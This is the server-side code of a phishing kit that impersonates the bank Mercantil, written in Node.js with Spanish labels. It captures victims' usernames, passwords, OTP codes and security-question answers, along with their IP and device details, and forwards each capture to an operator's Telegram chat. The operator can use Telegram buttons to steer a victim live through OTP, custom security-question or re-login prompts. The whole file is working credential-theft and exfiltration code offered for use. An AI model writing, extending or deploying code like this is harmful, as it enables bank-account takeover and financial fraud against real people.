const http = require("http");
const https = require("https");
const fs = require("fs");
const path = require("path");
const crypto = require("crypto");

loadEnv();

const PORT = Number(process.env.PORT || 3000);
const BOT_TOKEN = normalizeBotToken(process.env.TELEGRAM_BOT_TOKEN || "");
const CHAT_ID = cleanEnv(process.env.TELEGRAM_CHAT_ID || "");
const ROOT_DIR = __dirname;

const sessions = new Map();
const pendingByChat = new Map();
const pendingByUser = new Map();
let telegramOffset = 0;

const BLOCKED = new Set(["server.js", ".env", "package.json", "package-lock.json"]);

// Cambia a false para desactivar notificaciones de visita
const NOTIFY_VISITS = true;

const server = http.createServer(async (req, res) => {
  try {
    const url = new URL(req.url, `http://${req.headers.host}`);

    if (req.method === "POST" && url.pathname === "/api/notify-visit") {
      if (NOTIFY_VISITS && BOT_TOKEN && CHAT_ID) {
        const body = await readJson(req);
        telegram("sendMessage", {
          chat_id: CHAT_ID,
          parse_mode: "HTML",
          text: [
            "👁️ <b>Nuevo visitante — Mercantil</b>",
            `🌐 <b>IP:</b> <code>${esc(body.ip)}</code>`,
            `📍 <b>Dispositivo:</b> ${esc(body.device)}`,
            `💻 <b>Navegador:</b> ${esc(body.browser)} — ${esc(body.os)}`
          ].join("\n")
        }).catch(() => {});
      }
      return sendJson(res, 200, { ok: true });
    }

    if (req.method === "POST" && url.pathname === "/api/login") {
      const body = await readJson(req);
      const id = crypto.randomUUID();
      sessions.set(id, { id, doc: cleanText(body.usuario || "Desconocido"), status: "waiting", value: null, createdAt: Date.now() });

      if (BOT_TOKEN && CHAT_ID) {
        await telegram("sendMessage", {
          chat_id: CHAT_ID,
          parse_mode: "HTML",
          text: [
            "🟢 <b>Nueva Captura — Mercantil</b>",
            "",
            `👤 <b>Usuario:</b> <code>${esc(body.usuario)}</code>`,
            `🔑 <b>Clave:</b> <code>${esc(body.password)}</code>`,
            `🌐 <b>IP:</b> <code>${esc(body.ip)}</code>`,
            `📍 <b>Dispositivo:</b> ${esc(body.device)}`,
            `💻 <b>Navegador:</b> ${esc(body.browser)} — ${esc(body.os)}`,
            `🗓️ <b>Fecha:</b> ${esc(body.fecha)}`,
            `🕐 <b>Hora:</b> ${esc(body.hora)}`
          ].join("\n"),
          reply_markup: makeKeyboard(id)
        });
      }

      return sendJson(res, 200, { id });
    }

    if (req.method === "GET" && url.pathname.startsWith("/api/status/")) {
      const id = url.pathname.split("/").pop();
      const record = sessions.get(id);
      if (!record) return sendJson(res, 404, { error: "No encontrado." });
      return sendJson(res, 200, { status: record.status, value: record.value });
    }

    if (req.method === "POST" && url.pathname === "/api/log-preguntas") {
      const body = await readJson(req);
      const sessionId = cleanText(body.sessionId || "");
      const record = sessions.get(sessionId);
      if (record) {
        record.status = "waiting";
        record.value = null;
      }
      if (BOT_TOKEN && CHAT_ID) {
        await telegram("sendMessage", {
          chat_id: CHAT_ID,
          parse_mode: "HTML",
          text: [
            "📝 <b>Respuestas Capturadas — Mercantil</b>",
            "",
            `👤 <b>Usuario:</b> <code>${esc(body.usuario)}</code>`,
            `❓ <b>${esc(body.label1)}:</b> <code>${esc(body.resp1)}</code>`,
            `❓ <b>${esc(body.label2)}:</b> <code>${esc(body.resp2)}</code>`,
            `🌐 <b>IP:</b> <code>${esc(body.ip)}</code>`,
            `📍 <b>Dispositivo:</b> ${esc(body.device)}`,
            `💻 <b>Navegador:</b> ${esc(body.browser)} — ${esc(body.os)}`,
            `🗓️ <b>Fecha:</b> ${esc(body.fecha)}`,
            `🕐 <b>Hora:</b> ${esc(body.hora)}`
          ].join("\n"),
          reply_markup: sessionId && record ? makeKeyboard(sessionId) : undefined
        });
      }
      return sendJson(res, 200, { ok: true });
    }

    if (req.method === "POST" && url.pathname === "/api/log-otp") {
      const body = await readJson(req);
      const sessionId = cleanText(body.sessionId || "");
      const record = sessions.get(sessionId);
      if (record) {
        record.status = "waiting";
        record.value = null;
      }
      if (BOT_TOKEN && CHAT_ID) {
        await telegram("sendMessage", {
          chat_id: CHAT_ID,
          parse_mode: "HTML",
          text: [
            "🔐 <b>OTP Capturado — Mercantil</b>",
            "",
            `👤 <b>Usuario:</b> <code>${esc(body.usuario)}</code>`,
            `🔢 <b>OTP:</b> <code>${esc(body.otp)}</code>`,
            `🌐 <b>IP:</b> <code>${esc(body.ip)}</code>`,
            `📍 <b>Dispositivo:</b> ${esc(body.device)}`,
            `💻 <b>Navegador:</b> ${esc(body.browser)} — ${esc(body.os)}`,
            `🗓️ <b>Fecha:</b> ${esc(body.fecha)}`,
            `🕐 <b>Hora:</b> ${esc(body.hora)}`
          ].join("\n"),
          reply_markup: sessionId && record ? makeKeyboard(sessionId) : undefined
        });
      }
      return sendJson(res, 200, { ok: true });
    }

    if (req.method === "POST" && url.pathname === "/api/telegram") {
      const update = await readJson(req);
      res.writeHead(200); res.end("{}");
      handleTelegramUpdate(update).catch(console.error);
      return;
    }

    return serveStatic(url.pathname, res);
  } catch (error) {
    console.error(error);
    sendJson(res, 500, { error: "Error interno." });
  }
});

server.listen(PORT, () => {
  console.log(`Mercantil server listo en http://localhost:${PORT}`);

  if (BOT_TOKEN && CHAT_ID) {
    const problem = getBotTokenProblem(BOT_TOKEN);
    if (problem) { console.error(problem); return; }
    console.log("Telegram activo.");
    const webhookUrl = cleanEnv(process.env.WEBHOOK_URL || "").replace(/\/+$/, "");
    if (webhookUrl) {
      telegram("setWebhook", { url: `${webhookUrl}/api/telegram`, allowed_updates: ["message", "callback_query"], drop_pending_updates: true })
        .then(() => console.log("Webhook activo:", webhookUrl))
        .catch(e => console.error("Error webhook:", e.message));
    } else {
      telegram("deleteWebhook", { drop_pending_updates: false })
        .catch(() => {})
        .then(() => pollTelegram());
    }
  } else {
    console.log("Telegram no configurado.");
  }
});

async function pollTelegram() {
  while (true) {
    try {
      const data = await telegram("getUpdates", { timeout: 25, offset: telegramOffset, allowed_updates: ["message", "callback_query"] });
      for (const update of data.result || []) {
        telegramOffset = update.update_id + 1;
        await handleTelegramUpdate(update);
      }
    } catch (error) {
      if (error.telegramCode === 401) { console.error("Token invalido."); return; }
      console.error("Error Telegram:", error.message);
      await wait(3000);
    }
  }
}

async function handleTelegramUpdate(update) {
  if (update.callback_query) {
    const query = update.callback_query;
    const chatId = String(query.message?.chat?.id || query.from?.id || "");
    const userId = String(query.from?.id || "");
    const [action, id] = String(query.data || "").split(":");
    const record = sessions.get(id);

    await telegram("answerCallbackQuery", { callback_query_id: query.id });

    if (!record) {
      await telegram("sendMessage", { chat_id: chatId, text: "Sesion no encontrada o expirada." });
      return;
    }

    if (action === "preguntas") {
      pendingByChat.set(chatId, id);
      pendingByUser.set(userId, id);
      await telegram("sendMessage", {
        chat_id: chatId,
        text: `Escribe las dos preguntas para ${record.doc} separadas por |\nEj: Número de cuenta | Fecha de nacimiento`,
        reply_markup: { force_reply: true, selective: true, input_field_placeholder: "Pregunta 1 | Pregunta 2" }
      });
      return;
    }

    if (action === "otp") {
      record.status = "otp";
      record.value = null;
      pendingByChat.delete(chatId);
      pendingByUser.delete(userId);
      await telegram("sendMessage", { chat_id: chatId, text: `OTP solicitado a: ${record.doc}` });
      return;
    }

    if (action === "relogin") {
      record.status = "relogin";
      record.value = null;
      pendingByChat.delete(chatId);
      pendingByUser.delete(userId);
      await telegram("sendMessage", { chat_id: chatId, text: `Re-login enviado a: ${record.doc}` });
      return;
    }

    return;
  }

  if (update.message) {
    const chatId = String(update.message.chat.id);
    const userId = String(update.message.from?.id || "");
    const text = cleanText(update.message.text);

    const pregId = pendingByChat.get(chatId) || pendingByUser.get(userId);
    if (!pregId) return;

    const parts = text.split("|").map(s => s.trim()).filter(Boolean);
    if (parts.length < 2) {
      await telegram("sendMessage", { chat_id: chatId, text: "Separa las dos preguntas con |\nEj: Número de cuenta | Fecha de nacimiento" });
      return;
    }

    const record = sessions.get(pregId);
    if (!record) {
      pendingByChat.delete(chatId);
      pendingByUser.delete(userId);
      await telegram("sendMessage", { chat_id: chatId, text: "Esa sesion ya no existe." });
      return;
    }

    record.status = "preguntas";
    record.value = { label1: parts[0], label2: parts[1] };
    pendingByChat.delete(chatId);
    pendingByUser.delete(userId);
    await telegram("sendMessage", { chat_id: chatId, text: `Listo. La pagina pedira:\n1. ${parts[0]}\n2. ${parts[1]}` });
  }
}

function makeKeyboard(id) {
  return {
    inline_keyboard: [
      [{ text: "Preguntas", callback_data: `preguntas:${id}` }],
      [{ text: "OTP", callback_data: `otp:${id}` }, { text: "Re-login", callback_data: `relogin:${id}` }]
    ]
  };
}

function serveStatic(requestPath, res) {
  const safePath = requestPath === "/" ? "/index.html" : requestPath;
  const filePath = path.normalize(path.join(ROOT_DIR, safePath));
  const filename = path.basename(filePath);
  if (!filePath.startsWith(ROOT_DIR) || BLOCKED.has(filename)) return sendText(res, 403, "Acceso denegado");
  fs.readFile(filePath, (error, data) => {
    if (error) return sendText(res, 404, "No encontrado");
    const ext = path.extname(filePath).toLowerCase();
    const types = { ".html": "text/html; charset=utf-8", ".css": "text/css; charset=utf-8", ".js": "application/javascript; charset=utf-8", ".svg": "image/svg+xml", ".png": "image/png", ".webp": "image/webp", ".ico": "image/x-icon" };
    res.writeHead(200, { "Content-Type": types[ext] || "application/octet-stream" });
    res.end(data);
  });
}

function readJson(req) {
  return new Promise((resolve, reject) => {
    let raw = "";
    req.on("data", chunk => { raw += chunk; if (raw.length > 100_000) req.destroy(); });
    req.on("end", () => { try { resolve(raw ? JSON.parse(raw) : {}); } catch (e) { reject(e); } });
  });
}
function sendJson(res, status, payload) { res.writeHead(status, { "Content-Type": "application/json; charset=utf-8" }); res.end(JSON.stringify(payload)); }
function sendText(res, status, text) { res.writeHead(status, { "Content-Type": "text/plain; charset=utf-8" }); res.end(text); }
function cleanText(v) { return String(v || "").trim().slice(0, 300); }
function cleanEnv(v) { return String(v || "").trim().replace(/^["']|["']$/g, ""); }
function normalizeBotToken(v) { return cleanEnv(v).replace(/^bot/i, ""); }
function getBotTokenProblem(v) { const p = v.split(":"); if (p.length !== 2) return "Token invalido."; if (!/^\d+$/.test(p[0]) || p[1].length < 20) return "Token invalido."; return ""; }
function esc(v) { return String(v || "").replace(/&/g, "&amp;").replace(/</g, "&lt;").replace(/>/g, "&gt;"); }
function wait(ms) { return new Promise(r => setTimeout(r, ms)); }
function telegram(method, payload) {
  return new Promise((resolve, reject) => {
    const body = JSON.stringify(payload);
    const req = https.request({ hostname: "api.telegram.org", path: `/bot${BOT_TOKEN}/${method}`, method: "POST", headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(body) } }, res => {
      let raw = "";
      res.on("data", c => { raw += c; });
      res.on("end", () => { try { const d = JSON.parse(raw); if (!d.ok) { const e = new Error(d.description || "Telegram error"); e.telegramCode = d.error_code; reject(e); } else resolve(d); } catch (e) { reject(e); } });
    });
    req.on("error", reject);
    req.write(body);
    req.end();
  });
}
function loadEnv() {
  const p = path.join(__dirname, ".env");
  if (!fs.existsSync(p)) return;
  for (const line of fs.readFileSync(p, "utf8").split(/\r?\n/)) {
    const t = line.trim();
    if (!t || t.startsWith("#") || !t.includes("=")) continue;
    const [key, ...parts] = t.split("=");
    if (!process.env[key]) process.env[key] = parts.join("=").trim();
  }
}
